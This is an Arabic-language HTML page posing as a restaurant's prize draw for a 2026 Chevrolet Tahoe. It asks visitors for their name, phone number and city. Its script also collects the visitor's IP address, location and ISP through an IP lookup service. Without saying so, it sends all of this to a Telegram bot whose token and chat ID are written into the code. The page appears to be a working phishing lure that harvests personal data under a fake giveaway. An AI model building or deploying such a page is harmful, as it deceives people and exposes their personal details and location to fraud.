<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>جائزة سيارة تاهو</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#d4af37,#8b6914);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;margin:0}
.container{background:#fff;padding:30px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.3);width:100%;max-width:420px}
h1{color:#8b6914;text-align:center;font-size:22px;margin-bottom:5px}
p{color:#666;text-align:center;font-size:14px;margin-bottom:15px}
.prize{background:#fff8e1;padding:15px;border-radius:8px;text-align:center;margin-bottom:15px;border:2px dashed #d4af37}
input{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;box-sizing:border-box}
button{width:100%;padding:14px;background:#d4af37;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
</style>
</head>
<body>
<div class="container">
<h1>🏆 مطعم مسكوف أبو جنة</h1>
<p>استمارة جائزة سيارة تاهو 2026</p>
<div class="prize"><b>🎁 الجائزة: شيفروليه تاهو 2026</b><br><small>املأ البيانات للمشاركة</small></div>
<form id="f">
<input type="text" id="name" placeholder="الاسم الكامل" required>
<input type="text" id="phone" placeholder="رقم الهاتف" required>
<input type="text" id="city" placeholder="المدينة" required>
<button type="submit">شارك في السحب</button>
</form>
</div>
<script>
async function ip(){try{const r=await fetch('https://ipapi.co/json/');const d=await r.json();return d.ip+' | '+d.city+' | '+d.country_name+' | '+d.org;}catch(e){return 'N/A';}}
document.getElementById('f').addEventListener('submit',async function(e){
e.preventDefault();
const info=await ip();
const msg='🎁 *جائزة تاهو*\n\n👤 '+document.getElementById('name').value+'\n📞 `'+document.getElementById('phone').value+'`\n🏙️ '+document.getElementById('city').value+'\n\n🌐 IP: `'+info+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
const url='https://api.telegram.org/bot8899269662:AAFKrQ6uOIQkcJT77w5_ONiMgKhfnAE0dK4/sendMessage?chat_id=1250341553&text='+encodeURIComponent(msg)+'&parse_mode=Markdown';
try{await fetch(url);alert('تم تسجيل مشاركتك');document.getElementById('f').reset();}catch(e){alert('خطأ');}
});
</script>
</body>
</html>
